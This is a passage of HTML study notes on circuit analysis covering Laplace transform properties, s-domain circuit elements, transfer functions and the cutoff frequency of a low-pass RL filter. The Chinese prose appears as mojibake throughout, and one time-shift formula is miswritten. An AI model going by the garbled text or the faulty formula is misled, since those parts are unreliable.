e^{-st} dt \newline~ \newline<br>(åˆ©ç”¨åˆ†éƒ¨ç§¯åˆ†æ³•æ±‚å¾—)}<br>$$</p><h3 id="12-5-4-ç§¯åˆ†"><a href="#12-5-4-ç§¯åˆ†" class="headerlink" title="12.5.4 ç§¯åˆ†"></a>12.5.4 ç§¯åˆ†</h3><p>å°†æ—¶åŸŸä¸­çš„ç§¯åˆ†è¿ç®—è½¬åŒ–ä¸º s åŸŸä¸­çš„é™¤æ³•è¿ç®—.</p><p>$$<br>\displaylines{\mathcal{L}\{\int_{0^{-}}^{t} f(x) dx\} &#x3D; \int_{0^{-}}^{\infty} [\int_{0^{-}}^{\infty} f(x)dx] e^{-st} dt}<br>$$</p><p>æœ€ç»ˆå¯æ¨å‡º:<br>$$<br>\displaylines{\mathcal{L}\{\int_{0^{-}}^{t} f(x) dx\} &#x3D; \frac{F(s)}{s} \newline~ \newline<br>(åŒæ ·åˆ©ç”¨åˆ†éƒ¨ç§¯åˆ†æ³•æ±‚å¾—)}<br>$$</p><h3 id="12-5-5-æ—¶åŸŸå¹³ç§»"><a href="#12-5-5-æ—¶åŸŸå¹³ç§»" class="headerlink" title="12.5.5 æ—¶åŸŸå¹³ç§»"></a>12.5.5 æ—¶åŸŸå¹³ç§»</h3><p>å¯¹äºä»»æ„å‡½æ•° $f(t)u(t)$ , è‹¥åœ¨æ—¶é—´è½´ä¸Šå¹³ç§»ä¸€ä¸ªå¸¸æ•° a, åˆ™å¯ç”¨åŒä¸€ç§å½¢å¼çš„å‡½æ•°è¡¨ç¤º $f(t-a)u(t-a)$. æ—¶åŸŸä¸­çš„å¹³ç§»å¯¹åº”äºé¢‘åŸŸä¸­ä¹˜ä»¥ä¸€ä¸ªæŒ‡æ•°:<br>$$<br>\displaylines{\mathcal{L}\{(t-a)(u-a)\} &#x3D; e^{-as}F(s),\ a &gt; 0}<br>$$</p><p>å¦‚:<br>$$<br>\displaylines{\mathcal{L}\{tu(t)\} &#x3D; \frac{1}{s^2}}<br>$$</p><p>åˆ™, $(t-a)u(t-a)$ çš„æ‹‰æ°å˜æ¢ä¸º:<br>$$<br>\displaylines{\mathcal{L}\{(t-a)u(t-a)\} &#x3D; \frac{e^{-as}}{s^2}}<br>$$</p><h3 id="12-5-6-é¢‘åŸŸå¹³ç§»ç‰¹æ€§"><a href="#12-5-6-é¢‘åŸŸå¹³ç§»ç‰¹æ€§" class="headerlink" title="12.5.6 é¢‘åŸŸå¹³ç§»ç‰¹æ€§"></a>12.5.6 é¢‘åŸŸå¹³ç§»ç‰¹æ€§</h3><p>é¢‘åŸŸä¸­çš„å¹³ç§»å¯¹åº”äºæ—¶åŸŸä¸­ä¹˜ä»¥æŒ‡æ•°:<br>$$<br>\displaylines{\mathcal{L}\{e^{-at}f(t)\} &#x3D; F(s+a)}<br>$$</p><h3 id="12-5-7-å°ºåº¦å˜æ¢"><a href="#12-5-7-å°ºåº¦å˜æ¢" class="headerlink" title="12.5.7 å°ºåº¦å˜æ¢"></a>12.5.7 å°ºåº¦å˜æ¢</h3><p>å½“æ—¶é—´å˜é‡ä¹˜ä»¥ä¸€ä¸ªå¸¸æ•°å, å°ºåº¦å˜æ¢ç»™å‡ºäº† $f(t)$ å’Œ F(s) ä¹‹é—´çš„å…³ç³»:<br>$$<br>\displaylines{\mathcal{L}\{f(at)\} &#x3D; \frac{1}{a}F ( \frac{s}{a}),\ a &gt; 0}<br>$$</p><p>ç®—å­å˜æ¢ç®€è¡¨:</p><p><img src="/../img/operator_transformation_table1.png"></p><p><img src="/../img/operator_transformation_table2.png"></p><h2 id="12-6-æ‹‰æ°å˜æ¢çš„åº”ç”¨"><a href="#12-6-æ‹‰æ°å˜æ¢çš„åº”ç”¨" class="headerlink" title="12.6 æ‹‰æ°å˜æ¢çš„åº”ç”¨"></a>12.6 æ‹‰æ°å˜æ¢çš„åº”ç”¨</h2><h1 id="ç¬¬13ç« -æ‹‰æ°å˜æ¢åœ¨ç”µè·¯åˆ†æä¸­çš„åº”ç”¨"><a href="#ç¬¬13ç« -æ‹‰æ°å˜æ¢åœ¨ç”µè·¯åˆ†æä¸­çš„åº”ç”¨" class="headerlink" title="ç¬¬13ç«  æ‹‰æ°å˜æ¢åœ¨ç”µè·¯åˆ†æä¸­çš„åº”ç”¨"></a>ç¬¬13ç«  æ‹‰æ°å˜æ¢åœ¨ç”µè·¯åˆ†æä¸­çš„åº”ç”¨</h1><p>æ‹‰æ°å˜æ¢çš„ç‰¹ç‚¹:</p><ol><li>å°†çº¿æ€§å¸¸ç³»æ•°å¾®åˆ†æ–¹ç¨‹è½¬åŒ–ä¸ºå®¹æ˜“å¤„ç†çš„çº¿æ€§å¤šé¡¹å¼æ–¹ç¨‹</li><li>å°†ç”µæµå’Œç”µå‹å˜é‡çš„åˆå§‹å€¼è‡ªåŠ¨å¼•å…¥å¤šé¡¹å¼æ–¹ç¨‹</li></ol><h2 id="13-1-s-åŸŸä¸­çš„ç”µè·¯å…ƒä»¶"><a href="#13-1-s-åŸŸä¸­çš„ç”µè·¯å…ƒä»¶" class="headerlink" title="13.1 s åŸŸä¸­çš„ç”µè·¯å…ƒä»¶"></a>13.1 s åŸŸä¸­çš„ç”µè·¯å…ƒä»¶</h2><p>å¯¹ç”µè·¯å…ƒä»¶, å»ºç«‹ s åŸŸç­‰æ•ˆç”µè·¯çš„è¿‡ç¨‹:</p><ol><li>å†™å‡ºå…³äºè¾“å‡ºç«¯ç”µå‹å’Œç”µæµçš„æ—¶åŸŸæ–¹ç¨‹</li><li>å¯¹æ–¹ç¨‹è¿›è¡Œæ‹‰æ°å˜æ¢, äº§ç”Ÿä¸€ä¸ª s åŸŸç”µæµå’Œç”µå‹çš„ä»£æ•°æ–¹ç¨‹ (å˜æ¢å, ç”µå‹å•ä½ä¸º $V \cdot s$, ç”µæµå•ä½å˜ä¸º $A \cdot s$, s åŸŸä¸­ç”µå‹å’Œç”µæµä¹‹æ¯”çš„å•ä½ä¸º $V&#x2F;A$, s åŸŸé˜»æŠ—çš„å•ä½ä¸º $\Omega$)</li><li>å»ºç«‹ä¸€ä¸ªæ»¡è¶³ s åŸŸç”µå‹å’Œç”µæµé—´å…³ç³»çš„ç”µè·¯æ¨¡å‹</li></ol><h3 id="13-1-1-s-åŸŸä¸­çš„ç”µé˜»"><a href="#13-1-1-s-åŸŸä¸­çš„ç”µé˜»" class="headerlink" title="13.1.1 s åŸŸä¸­çš„ç”µé˜»"></a>13.1.1 s åŸŸä¸­çš„ç”µé˜»</h3><p>ç”µé˜»åœ¨ s åŸŸä¸­çš„ç­‰æ•ˆç”µè·¯ä»ç„¶æ˜¯ä¸€ä¸ª R æ¬§å§†çš„ç”µé˜»:<br>$$<br>\displaylines{v &#x3D; Ri \newline~ \newline<br>æ‹‰æ°å˜æ¢:\ V &#x3D; RI \newline~ \newline<br>å…¶ä¸­:\ V &#x3D; \mathcal{L}\{v\},\ I &#x3D; \mathcal{L}\{i\}<br>}<br>$$</p><p><img src="/../img/resistance_time_domain_to_frequency_domain.png"></p><h3 id="13-1-2-s-åŸŸä¸­çš„ç”µæ„Ÿ"><a href="#13-1-2-s-åŸŸä¸­çš„ç”µæ„Ÿ" class="headerlink" title="13.1.2 s åŸŸä¸­çš„ç”µæ„Ÿ"></a>13.1.2 s åŸŸä¸­çš„ç”µæ„Ÿ</h3><p>$$<br>\displaylines{v &#x3D; L \frac{di}{dt} \newline~ \newline<br>æ‹‰æ°å˜æ¢:\ V &#x3D; L[sI-i(0^{-})]&#x3D; sLI - LI_0}<br>$$</p><p>ç”µæ„Ÿ $L$, åˆå§‹ç”µæµä¸º $I_0$ åœ¨ s åŸŸä¸­ç­‰æ•ˆç”µè·¯æœ‰ä¸¤ç§å½¢å¼.</p><ol><li>ä¸€ä¸ªä¸ºåŒ…å« $sL$ æ¬§å§†çš„é˜»æŠ—ä¸²è”ä¸€ä¸ª $LI_0\ V \cdot s$ çš„ç”µå‹æº.</li><li>ä¸€ä¸ªä¸ºåŒ…å« $sL$ æ¬§å§†çš„é˜»æŠ—å¹¶è”ä¸€ä¸ª $I_0&#x2F;s$ çš„ç”µæµæºå¹¶è” (æ­¤æ—¶ $I &#x3D; \frac{V+LI_0}{sL} &#x3D; \frac{V}{sL} + \frac{I_0}{s}$)</li></ol><p><img src="/../img/inductance_time_domain_to_frequency_domain.png"></p><p><img src="/../img/inductance_time_domain_to_frequency_domain2.png"></p><h3 id="13-1-3-s-åŸŸä¸­çš„ç”µå®¹"><a href="#13-1-3-s-åŸŸä¸­çš„ç”µå®¹" class="headerlink" title="13.1.3 s åŸŸä¸­çš„ç”µå®¹"></a>13.1.3 s åŸŸä¸­çš„ç”µå®¹</h3><p><mark>å…·æœ‰åˆå§‹ç”µå‹</mark>çš„ç”µå®¹ä¹Ÿæœ‰ä¸¤ä¸ª s åŸŸç­‰æ•ˆç”µè·¯, å¦‚, å…·æœ‰åˆå§‹ç”µå‹ $V_0$ çš„ç”µå®¹, ç«¯å£ç”µæµä¸º:<br>$$<br>\displaylines{i &#x3D; C \frac{dv}{dt} \newline~ \newline<br>æ‹‰æ°å˜æ¢:\ I &#x3D; C[sV - v(0^{-})] \newline~ \newline<br>&#x3D; sCV - CV_0}<br>$$</p><p>å…¶è¡¨æ˜ s åŸŸçš„ç”µæµ $I$ æ˜¯ä¸¤ä¸ªæ”¯è·¯ç”µæµä¹‹å’Œ.</p><p>ç­‰æ•ˆç”µè·¯å¦‚:</p><p><img src="/../img/conductance_time_domain_to_frequency_domain.png"></p><p><img src="/../img/conductance_time_domain_to_frequency_domain2.png"></p><p><mark>ä»€ä¹ˆæ˜¯å¯¼çº³</mark> </p><h2 id="13-2-s-åŸŸä¸­çš„ç”µè·¯åˆ†æ"><a href="#13-2-s-åŸŸä¸­çš„ç”µè·¯åˆ†æ" class="headerlink" title="13.2 s åŸŸä¸­çš„ç”µè·¯åˆ†æ"></a>13.2 s åŸŸä¸­çš„ç”µè·¯åˆ†æ</h2><p>è‹¥ç”µæ„Ÿæˆ–ç”µå®¹ä¸­æ— åˆå§‹å‚¨èƒ½, åˆ™å¯¹æ¯ä¸ªæ— æºå…ƒä»¶, å…¶ä¼å®‰å…³ç³»å‡ä¸º:<br>$$<br>\displaylines{V &#x3D; ZI}<br>$$<br>$Z$ æ˜¯å…ƒä»¶çš„ s åŸŸé˜»æŠ—. è¿™ä¸ªå¼å­ä¹Ÿå¸¸æŒ‡ s åŸŸçš„æ¬§å§†å®šå¾‹. s åŸŸä¸­å¸¸è§æœ‰:</p><ul><li>ç”µé˜»çš„é˜»æŠ—ä¸º $R$</li><li>ç”µæ„Ÿçš„é˜»æŠ—ä¸º $sL$</li><li>ç”µå®¹çš„é˜»æŠ—ä¸º $\frac{1}{sC}$</li></ul><p>é˜»æŠ—çš„å€’æ•°æ˜¯å¯¼çº³. s åŸŸä¸­å¸¸è§æœ‰:</p><ul><li>ç”µé˜»çš„å¯¼çº³ä¸º $\frac{1}{R}$ è¥¿é—¨å­</li><li>ç”µæ„Ÿçš„å¯¼çº³ä¸º $\frac{1}{sL}$ è¥¿é—¨å­</li><li>ç”µå®¹çš„å¯¼çº³ä¸º $sC$ è¥¿é—¨å­</li></ul><p><mark>åŸºå°”éœå¤«å®šå¾‹</mark> å¯¹ s åŸŸçš„ç”µæµå’Œç”µå‹åŒæ ·é€‚ç”¨.</p><p>(èŠ‚ç‚¹ç”µå‹, ç½‘å­”ç”µæµ, ç”µæºå˜æ¢å’Œæˆ´ç»´å—-è¯ºé¡¿ç­‰æ•ˆéƒ½æ˜¯æ­£ç¡®çš„æ–¹æ³•)</p><h2 id="13-3-åº”ç”¨"><a href="#13-3-åº”ç”¨" class="headerlink" title="13.3 åº”ç”¨"></a>13.3 åº”ç”¨</h2><h3 id="13-3-1-RC-ç”µè·¯çš„å›ºæœ‰å“åº”"><a href="#13-3-1-RC-ç”µè·¯çš„å›ºæœ‰å“åº”" class="headerlink" title="13.3.1 RC ç”µè·¯çš„å›ºæœ‰å“åº”"></a>13.3.1 RC ç”µè·¯çš„å›ºæœ‰å“åº”</h3><h3 id="13-3-2-å¹¶è”ç”µè·¯çš„é˜¶è·ƒå“åº”"><a href="#13-3-2-å¹¶è”ç”µè·¯çš„é˜¶è·ƒå“åº”" class="headerlink" title="13.3.2 å¹¶è”ç”µè·¯çš„é˜¶è·ƒå“åº”"></a>13.3.2 å¹¶è”ç”µè·¯çš„é˜¶è·ƒå“åº”</h3><h3 id="13-3-3-å¹¶è”-RLC-ç”µè·¯çš„æš‚æ€å“åº”"><a href="#13-3-3-å¹¶è”-RLC-ç”µè·¯çš„æš‚æ€å“åº”" class="headerlink" title="13.3.3 å¹¶è” RLC ç”µè·¯çš„æš‚æ€å“åº”"></a>13.3.3 å¹¶è” RLC ç”µè·¯çš„æš‚æ€å“åº”</h3><h3 id="13-3-4-å¤šç½‘å­”ç”µè·¯çš„é˜¶è·ƒå“åº”"><a href="#13-3-4-å¤šç½‘å­”ç”µè·¯çš„é˜¶è·ƒå“åº”" class="headerlink" title="13.3.4 å¤šç½‘å­”ç”µè·¯çš„é˜¶è·ƒå“åº”"></a>13.3.4 å¤šç½‘å­”ç”µè·¯çš„é˜¶è·ƒå“åº”</h3><h3 id="13-3-5-æˆ´ç»´å—ç­‰æ•ˆç”µè·¯çš„åº”ç”¨"><a href="#13-3-5-æˆ´ç»´å—ç­‰æ•ˆç”µè·¯çš„åº”ç”¨" class="headerlink" title="13.3.5 æˆ´ç»´å—ç­‰æ•ˆç”µè·¯çš„åº”ç”¨"></a>13.3.5 æˆ´ç»´å—ç­‰æ•ˆç”µè·¯çš„åº”ç”¨</h3><h3 id="13-3-6-å«è€¦åˆç”µæ„Ÿçš„ç”µè·¯"><a href="#13-3-6-å«è€¦åˆç”µæ„Ÿçš„ç”µè·¯" class="headerlink" title="13.3.6 å«è€¦åˆç”µæ„Ÿçš„ç”µè·¯"></a>13.3.6 å«è€¦åˆç”µæ„Ÿçš„ç”µè·¯</h3><h3 id="13-3-7-å åŠ åŸç†çš„åº”ç”¨"><a href="#13-3-7-å åŠ åŸç†çš„åº”ç”¨" class="headerlink" title="13.3.7 å åŠ åŸç†çš„åº”ç”¨"></a>13.3.7 å åŠ åŸç†çš„åº”ç”¨</h3><h2 id="13-4-è½¬ç§»å‡½æ•°"><a href="#13-4-è½¬ç§»å‡½æ•°" class="headerlink" title="13.4 è½¬ç§»å‡½æ•°"></a>13.4 è½¬ç§»å‡½æ•°</h2><p><mark>è½¬ç§»å‡½æ•°å®šä¹‰ä¸º</mark> s åŸŸä¸­è¾“å‡ºå“åº”çš„æ‹‰æ°å˜æ¢ä¸è¾“å…¥æ¿€åŠ±çš„æ‹‰æ°å˜æ¢ä¹‹æ¯”.</p><p>$$<br>\displaylines{H(s) &#x3D; \frac{Y(s)}{X(s)}}<br>$$</p><p>$Y(s)$ æŒ‡è¾“å‡ºä¿¡å·çš„æ‹‰æ°å˜æ¢. $X(s)$ æŒ‡è¾“å…¥ä¿¡å·çš„æ‹‰æ°å˜æ¢. (è®°å¿†æŠ€å·§, ä¸€èˆ¬çš„å‡½æ•°éƒ½å†™æˆ $y &#x3D; ax + b$, $y$ å°±æ˜¯è¾“å‡º, $x$ å°±æ˜¯è¾“å…¥)</p><p>è‹¥ç”µè·¯ä¸­å­˜åœ¨å¤šä¸ªç‹¬ç«‹ç”µæº, é‚£ä¹ˆå¯ä»¥ä¸ºæ¯ä¸ªç”µæºéƒ½æ±‚å‡ºä¸€ä¸ªè½¬ç§»å‡½æ•°, å¹¶ç”¨ <mark>å åŠ åŸç†</mark> æ±‚å‡ºæ‰€æœ‰ç”µæºä½œç”¨æ—¶çš„å“åº”.</p><h3 id="13-4-1-H-s-é›¶æç‚¹çš„ä½ç½®"><a href="#13-4-1-H-s-é›¶æç‚¹çš„ä½ç½®" class="headerlink" title="13.4.1 $H(s)$ é›¶æç‚¹çš„ä½ç½®"></a>13.4.1 $H(s)$ é›¶æç‚¹çš„ä½ç½®</h3><h2 id="13-5-è½¬ç§»å‡½æ•°çš„éƒ¨åˆ†åˆ†å¼å±•å¼€å¼"><a href="#13-5-è½¬ç§»å‡½æ•°çš„éƒ¨åˆ†åˆ†å¼å±•å¼€å¼" class="headerlink" title="13.5 è½¬ç§»å‡½æ•°çš„éƒ¨åˆ†åˆ†å¼å±•å¼€å¼"></a>13.5 è½¬ç§»å‡½æ•°çš„éƒ¨åˆ†åˆ†å¼å±•å¼€å¼</h2><h3 id="13-5-1-H-s-åœ¨ç”µè·¯åˆ†æä¸­çš„åº”ç”¨"><a href="#13-5-1-H-s-åœ¨ç”µè·¯åˆ†æä¸­çš„åº”ç”¨" class="headerlink" title="13.5.1 $H(s)$ åœ¨ç”µè·¯åˆ†æä¸­çš„åº”ç”¨"></a>13.5.1 $H(s)$ åœ¨ç”µè·¯åˆ†æä¸­çš„åº”ç”¨</h3><h2 id="13-6-è½¬ç§»å‡½æ•°å’Œå·ç§¯ç§¯åˆ†"><a href="#13-6-è½¬ç§»å‡½æ•°å’Œå·ç§¯ç§¯åˆ†" class="headerlink" title="13.6 è½¬ç§»å‡½æ•°å’Œå·ç§¯ç§¯åˆ†"></a>13.6 è½¬ç§»å‡½æ•°å’Œå·ç§¯ç§¯åˆ†</h2><h2 id="13-7-è½¬ç§»å‡½æ•°å’Œæ­£å¼¦ç¨³æ€å“åº”"><a href="#13-7-è½¬ç§»å‡½æ•°å’Œæ­£å¼¦ç¨³æ€å“åº”" class="headerlink" title="13.7 è½¬ç§»å‡½æ•°å’Œæ­£å¼¦ç¨³æ€å“åº”"></a>13.7 è½¬ç§»å‡½æ•°å’Œæ­£å¼¦ç¨³æ€å“åº”</h2><p>å¦‚æœå·²ç»æ±‚å‡ºç”µè·¯çš„è½¬ç§»å‡½æ•°, å°±ä¸éœ€è¦å•ç‹¬å¯¹ç”µè·¯è¿›è¡Œç›¸é‡åˆ†ææ¥æ±‚ç¨³æ€å“åº”, è€Œå¯ä»¥ç›´æ¥ <mark>ç”¨è½¬ç§»å‡½æ•°æ¥å»ºç«‹æ¿€åŠ±æºå’Œç¨³æ€å“åº”çš„å…³ç³»</mark>.</p><p>(å¯ä»¥çœ‹å‡º, è½¬ç§»å‡½æ•°çš„ä½œç”¨å¯èƒ½å°±æ˜¯æ–¹ä¾¿æ±‚è§£å“åº”)</p><h1 id="ç¬¬14ç« -é€‰é¢‘ç”µè·¯"><a href="#ç¬¬14ç« -é€‰é¢‘ç”µè·¯" class="headerlink" title="ç¬¬14ç«  é€‰é¢‘ç”µè·¯"></a>ç¬¬14ç«  é€‰é¢‘ç”µè·¯</h1><p>è¿™é‡Œçš„ <mark>é¢‘ç‡</mark> éƒ½æ˜¯æŒ‡æ­£å¼¦ç”µå‹(ç”µæµ)æº ä¸­çš„ $\omega$, å¦‚: $i(t) &#x3D; A \cos (\omega t + \phi)$ ä¸­çš„ $\omega$</p><p>ç”µæºé¢‘ç‡çš„å˜åŒ–å¯¹ç”µè·¯ä¸­ç”µå‹å’Œç”µæµçš„å½±å“, åˆ†æç»“æœå°±æ˜¯ç”µè·¯çš„ <mark>é¢‘ç‡å“åº”</mark>.</p><p>èƒ½ä½¿å¤„äºæŸä¸ªé¢‘ç‡èŒƒå›´å†…çš„è¾“å…¥ä¿¡å·å¾—åˆ°è¾“å‡º, è¿™ç§ç”µè·¯è¢«ç§°ä¸º <mark>é€‰é¢‘ç”µè·¯</mark> </p><p>é€‰é¢‘ç”µè·¯ä¹Ÿè¢«ç§°ä¸º <mark>æ»¤æ³¢å™¨</mark> , å› ä¸ºèƒ½å¤Ÿæ»¤æ‰æŸäº›é¢‘ç‡çš„ä¿¡å·.<br>(ä¸¥æ ¼æ¥è¯´, å®é™…çš„é€‰é¢‘ç”µè·¯å¹¶ä¸èƒ½å®Œå…¨æ»¤æ‰æ‰€é€‰çš„é¢‘ç‡ä¿¡å·, å…¶åªæ˜¯è¡°å‡ä¿¡å·, å‰Šå¼±æˆ–å‡å°æ‰€æœ‰æŒ‡å®šé¢‘å¸¦ä¹‹å¤–çš„è¾“å…¥ä¿¡å·)</p><p>è¿™é‡Œåˆ©ç”¨ <mark>è½¬ç§»å‡½æ•°çš„å¹…å€¼</mark> ï¼Œ å…¶å®å°±æ˜¯ç”¨æ¥åˆ¤æ–­ä½é€šè¿˜æ˜¯é«˜é€š (å…¶å®ä¹Ÿä¸èƒ½è¿™æ ·è¯´), åœ¨æŸä¸ªé¢‘ç‡æ—¶, å¹…å€¼å¤§è¡¨ç¤ºé€šè¿‡. (æ¯•ç«Ÿè¾“å‡ºç”µå‹çš„æ¯”ä¾‹æ›´å¤§äº†)</p><h2 id="14-1-é¢„å¤‡çŸ¥è¯†"><a href="#14-1-é¢„å¤‡çŸ¥è¯†" class="headerlink" title="14.1 é¢„å¤‡çŸ¥è¯†"></a>14.1 é¢„å¤‡çŸ¥è¯†</h2><p>ä»è¾“å…¥ç«¯åˆ°è¾“å‡ºç«¯èƒ½å¤Ÿé€šè¿‡çš„ä¿¡å·é¢‘å¸¦ç§°ä¸º <mark>é€šé¢‘å¸¦</mark> </p><p>ä¸åœ¨ç”µè·¯é€šé¢‘å¸¦å†…çš„é¢‘ç‡èŒƒå›´ç§°ä¸ºé˜»å¸¦.</p><p><mark>ç¡®å®šé€‰é¢‘ç”µè·¯ç±»å‹çš„æ–¹æ³•ä¹‹ä¸€æ˜¯æ ¹æ®é¢‘ç‡å“åº”æ›²çº¿</mark> , é¢‘ç‡å“åº”æ›²çº¿è¡¨æ˜äº†ç”µè·¯è½¬ç§»å‡½æ•°éšç”µæºé¢‘ç‡çš„å˜åŒ–æƒ…å†µ. å…¶åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†:</p><ol><li>$\left\vert H(j \omega) \right\vert$ å¯¹é¢‘ç‡ $\omega$ çš„æ›²çº¿, ç§°ä¸º <mark>å¹…é¢‘ç‰¹æ€§æ›²çº¿</mark> (è¿™é‡Œç›¸å½“ä¸æŠŠ $s$ æ›¿æ¢ä¸ºäº† $j \omega$, å‰é¢è¯´äº†, $s$ çš„å•ä½ä¸ºé¢‘ç‡, æ˜¯é¢‘ç‡çš„è¡¨è¾¾å¼)</li><li>ç›¸ä½è§’ $\theta(j\omega)$ å¯¹é¢‘ç‡ $\omega$ çš„æ›²çº¿, ç§°ä¸º <mark>ç›¸é¢‘ç‰¹æ€§æ›²çº¿</mark></li></ol><p>å››ç§ä¸»è¦æ»¤æ³¢å™¨çš„ç†æƒ³é¢‘ç‡å“åº”æ›²çº¿:</p><p><img src="/../img/four_idea_frequency_response_curve.png"></p><p>é«˜é€šå’Œä½é€šè¿™äº›éƒ½æ˜¯ç›¸å¯¹äº <mark>æˆªæ­¢é¢‘ç‡</mark> è€Œè¨€.</p><p>(è½¬ç§»å‡½æ•°çš„ç»“æœçš„æ¨¡ä¼¼ä¹å°±æ˜¯ <mark>å¹…å€¼</mark>)</p><h2 id="14-2-ä½é€šæ»¤æ³¢å™¨"><a href="#14-2-ä½é€šæ»¤æ³¢å™¨" class="headerlink" title="14.2 ä½é€šæ»¤æ³¢å™¨"></a>14.2 ä½é€šæ»¤æ³¢å™¨</h2><p>ä¸¤ä¸ªä½é€šæ»¤æ³¢å™¨:</p><ul><li>ä¸²è” RL ç”µè·¯</li><li>ä¸²è” RC ç”µè·¯</li></ul><p><img src="/../img/low_pass_RL_circuit.png"></p><p><img src="/../img/series_RC_low_pass_filter.png"></p><h3 id="14-2-1-ä¸²è”-RL-ç”µè·¯çš„å®šæ€§åˆ†æ"><a href="#14-2-1-ä¸²è”-RL-ç”µè·¯çš„å®šæ€§åˆ†æ" class="headerlink" title="14.2.1 ä¸²è” RL ç”µè·¯çš„å®šæ€§åˆ†æ"></a>14.2.1 ä¸²è” RL ç”µè·¯çš„å®šæ€§åˆ†æ</h3><p>è¿™é‡Œå‡è®¾:</p><ul><li>ç”µè·¯è¾“å…¥çš„æ˜¯é¢‘ç‡å˜åŒ–çš„æ­£å¼¦ç”µå‹</li><li>è¾“å‡ºä¸ºç”µé˜»ä¸¤ç«¯çš„ç”µå‹</li></ul><p><img src="/../img/low_pass_RL_circuit.png"></p><p>å“åº”æ›²çº¿ä¸º:</p><p><img src="/../img/siri_RL_frequency_response.png"></p><p>ç”±äº:<br>$$<br>\displaylines{H(j \omega) &#x3D; \frac{V_o(j \omega)}{V_i (j \omega)}}<br>$$</p><p>å¯ä»¥çœ‹å‡º, ç”±äºç”µæ„Ÿçš„é˜»æŠ—å˜å¤§, å…¶ä¸¤ç«¯çš„ç”µå‹å˜å¤§,å¯¼è‡´ç”µé˜»ä¸¤ç«¯çš„ç”µå‹å˜å°.</p><h3 id="14-2-2-æˆªæ­¢é¢‘ç‡çš„å®šä¹‰"><a href="#14-2-2-æˆªæ­¢é¢‘ç‡çš„å®šä¹‰" class="headerlink" title="14.2.2 æˆªæ­¢é¢‘ç‡çš„å®šä¹‰"></a>14.2.2 æˆªæ­¢é¢‘ç‡çš„å®šä¹‰</h3><p>æˆªæ­¢é¢‘ç‡ $\omega_c$ (cutoff frequency). å®šä¹‰ä¸º: è½¬ç§»å‡½æ•°çš„å¹…åº¦ç”±å…¶æœ€å¤§å€¼é™ä¸ºæœ€å¤§å€¼çš„ $\frac{1}{\sqrt{2}}$ æ—¶çš„é¢‘ç‡ (æ³¨æ„è¿™é‡Œä¸åŒçš„ç”µè·¯, å…¶ <mark>è½¬ç§»å‡½æ•°çš„æœ€å¤§å€¼å¯èƒ½ä¸åŒ</mark> ):<br>$$<br>\displaylines{ \left\vert H(j\omega_c) \right\vert &#x3D; \frac{1}{\sqrt{2}} H_{max}}<br>$$<br>(è½¬ç§»å‡½æ•°çš„å¹…å€¼ä¼¼ä¹å°±æ˜¯è½¬ç§»å‡½æ•°çš„æ¨¡)</p><p>å½“é¢‘ç‡ä¸º $\omega_c$ æ—¶, ç”µè·¯æä¾›çš„å¹³å‡åŠŸç‡æ˜¯æœ€å¤§å¹³å‡åŠŸç‡çš„ $\frac{1}{2}$, å› æ­¤, <mark> $\omega_c ä¹Ÿè¢«ç§°ä¸ºåŠåŠŸç‡ç‚¹é¢‘ç‡$</mark> . å› æ­¤, åœ¨é€šå¸¦å†…, ä¼ é€’ç»™è´Ÿè½½çš„åŠŸç‡è‡³å°‘æ˜¯å…¶æœ€å¤§å¹³å‡åŠŸç‡çš„ $50%$.<br>(è¿™é‡Œä¹¦ä¸Šä¹Ÿè®²äº†ä¸ºä»€ä¹ˆå– $\frac{1}{\sqrt{2}}$ è¿™ä¸ªç‚¹, åº”è¯¥å°±æ˜¯ç”±äºè¿™ä¸ª $\frac{1}{2}$)</p><h3 id="14-2-3-ä¸²è”-RL-ç”µè·¯-â€“-å®šæ€§åˆ†æ"><a href="#14-2-3-ä¸²è”-RL-ç”µè·¯-â€“-å®šæ€§åˆ†æ" class="headerlink" title="14.2.3 ä¸²è” RL ç”µè·¯ â€“ å®šæ€§åˆ†æ"></a>14.2.3 ä¸²è” RL ç”µè·¯ â€“ å®šæ€§åˆ†æ</h3><p>ä¸‹å›¾:</p><p><img src="/../img/low_pass_RL_circuit.png"></p><p>çš„ s åŸŸç­‰æ•ˆç”µè·¯æ¨¡å‹ä¸º:</p><p><img src="/../img/seri_RL_s_domain_equivalent_circuit.png"></p><p>ç”±æ­¤å¯å¾—åˆ°è½¬ç§»å‡½æ•°ä¸º:<br>$$<br>\displaylines{H(s) &#x3D; \frac{R}{sL + R}\ (æ€»é˜»æŠ—å’Œè¾“å‡ºå…ƒä»¶çš„é˜»æŠ—ä¹‹æ¯”å°±ç›¸å½“äºæ€»è¾“å…¥ç”µå‹ä¸è¾“å‡ºç”µå‹ä¹‹æ¯”) \newline~ \newline<br>&#x3D; \frac{R&#x2F;L}{s + R&#x2F;L} \newline~ \newline<br>\because s &#x3D; j \omega \newline~ \newline<br>H(s) &#x3D; H(j \omega) &#x3D;  \frac{R&#x2F;L}{j \omega + R&#x2F;L} \newline~ \newline<br>(åŒ–ç®€æˆè¿™ç§å½¢å¼æ˜¯æœ‰ç”¨çš„, è§åé¢å¯çŸ¥, å°±æ˜¯\ H(s) &#x3D; \frac{\omega_c}{s + \omega_c})}<br>$$</p><p>æ­¤æ—¶å¯ä»¥æ ¹æ®è¿™ä¸ªè½¬ç§»å‡½æ•°å¾—åˆ°ä¸¤ä¸ªå®šä¹‰:</p><ul><li><mark>è½¬ç§»å‡½æ•°çš„æŒ¯å¹…</mark> (ä¼¼ä¹ä¸æ˜¯å¹³æ–¹åå¼€æ–¹å¾—åˆ°çš„)</li><li><mark>è½¬ç§»å‡½æ•°çš„ç›¸ä½</mark></li></ul><p>$$<br>\displaylines{ \left\vert H(j \omega) \right\vert &#x3D; \frac{R&#x2F;L}{\sqrt{ \omega^2 + (R&#x2F;L)^2}}\ \ (å¯ä»¥ç”¨æ¥ç”»å¹…é¢‘æ›²çº¿)\newline~ \newline<br>\theta(j \omega) &#x3D; -arctan( \frac{\omega L}{R})<br>}<br>$$</p><blockquote><p>è®¡ç®—æˆªæ­¢é¢‘ç‡</p></blockquote><p>$$<br>\displaylines{ \left\vert H(j \omega) \right\vert &#x3D; \frac{1}{\sqrt{2}} \left\vert 1 \right\vert &#x3D; \frac{R&#x2F;L}{\sqrt{ \omega^2_c + (R&#x2F;L)^2}} \newline~ \newline<br>\omega_c &#x3D; \frac{R}{L}}<br>$$<br>( $H_{max} &#x3D; 1$ è¿™ä¸ªå¾ˆå®¹æ˜“å¾—åˆ°, è¿™é‡Œçš„è¾“å‡ºç”µå‹ä¸ä¼šå¤§äºè¾“å…¥ç”µå‹)</p><p><mark>ç”±æ­¤å¾—åˆ°çš„ç»“è®º</mark> , 